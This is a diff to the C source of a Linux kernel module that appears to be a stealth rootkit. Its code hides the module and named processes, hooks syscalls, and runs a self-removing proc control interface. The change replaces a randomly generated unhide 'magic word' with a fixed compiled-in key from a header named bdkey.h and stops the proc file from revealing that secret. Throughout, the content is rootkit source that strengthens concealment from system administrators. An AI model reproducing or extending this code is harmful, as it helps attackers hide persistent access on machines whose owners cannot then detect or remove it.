@@ -29,6 +29,7 @@
 #include "lkm.h"
 #include "fs.h"
 #include "version.h"
+#include "bdkey.h"
 #include "log.h"
 
 #define MAX_PROCFS_SIZE PAGE_SIZE
@@ -329,30 +330,6 @@ out_put_kobj:
     mod_list = NULL;
 }
 
-static char *get_unhide_magic_word(void) {
-    static char *magic_word;
-
-    if(!magic_word) {
-        char *m = NULL;
-
-        /** must be pretty unlucky
-         * for this to be forever loop
-         */
-        do {
-            if (m) {
-                kfree(m);
-                m = NULL;
-            }
-            m = kv_util_random_AZ_string(MAX_MAGIC_WORD_SIZE);
-        } while(strstr(m, "kovid"));
-
-        magic_word = m;
-    }
-
-    /* magic_word must be freed later */
-    return magic_word;
-}
-
 struct elfbits_t {
     char bits[MAX_PROCFS_SIZE+1];
     bool ready;
@@ -409,11 +386,7 @@ static ssize_t _seq_read(struct file *fptr, char __user *buffer,
         if (copy_to_user(buffer, b, len))
             return -EFAULT;
     } else {
-        char b[MAX_MAGIC_WORD_SIZE+2] = {0};
-        len = snprintf(b, sizeof(b),
-                "%s\n", get_unhide_magic_word());
-        if (copy_to_user(buffer, b, len))
-            return -EFAULT;
+        return -ENOENT;
     }
 
     *ppos = len;
@@ -423,9 +396,8 @@ static ssize_t _seq_read(struct file *fptr, char __user *buffer,
 /*
  * This function removes the proc interface after a
  * certain amount of time has passed.
- * It can be re-activated using a magic
- * kill signal. It's important to have this feature
- * because the `rmmod` magic key has been dumped on it.
+ * It can be re-activated using a
+ * kill signal.
  */
 static int proc_timeout(unsigned int t) {
     static unsigned int cnt = PRC_TIMEOUT;
@@ -528,8 +500,9 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                 break;
             case Opt_unhide_module:
                 {
-                    char *magik = get_unhide_magic_word();
-                    if(!strcmp(args[0].from, magik)) {
+                    uint64_t val;
+                    if (sscanf(args[0].from, "%llx", &val) &&
+                            UNHIDEKEY == val) {
                         kv_unhide_mod();
                     }
                 }
@@ -755,9 +728,6 @@ out:
 }
 
 static void _unroll_init(void) {
-    char *magik = get_unhide_magic_word();
-
-
     if (tsk_prc) {
         kthread_unpark(tsk_prc);
         kthread_stop(tsk_prc);
@@ -766,14 +736,13 @@ static void _unroll_init(void) {
 
     _proc_rm_wrapper();
     sys_deinit();
-    kfree(magik);
     kv_pid_cleanup();
 }
 
 static int __init kv_init(void) {
 
     int rv = 0;
-    char *magik, *procname_err = "";
+    char *procname_err = "";
     const char *hideprocname[] = {PROCNAME, NULL};
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
     struct kernel_syscalls *kaddr = NULL;
@@ -795,10 +764,6 @@ static int __init kv_init(void) {
 
     if (!kv_pid_init(kv_kall_load_addr()))
         goto addr_error;
-
-    magik = get_unhide_magic_word();
-    if(!magik)
-        goto magic_word_error;
 
     if (!sys_init())
         goto sys_init_error;
@@ -861,13 +826,8 @@ addr_error:
     prerr("Could not get kernel function address, proc file not created.\n");
     rv = -EFAULT;
     goto leave;
-magic_word_error:
-    prerr("Could not load magic word. proc file not created\n");
-    rv = -EFAULT;
-    goto leave;
 sys_init_error:
     prerr("Could not load syscalls hooks\n");
-    kfree(magik);
     rv = -EFAULT;
     goto leave;
 procname_missing:
@@ -878,12 +838,6 @@ leave:
 }
 
 static void __exit kv_cleanup(void) {
-    char *magik = get_unhide_magic_word();
-    if(magik != NULL) {
-        kfree(magik);
-        magik = NULL;
-    }
-
     sys_deinit();
     kv_pid_cleanup();
 
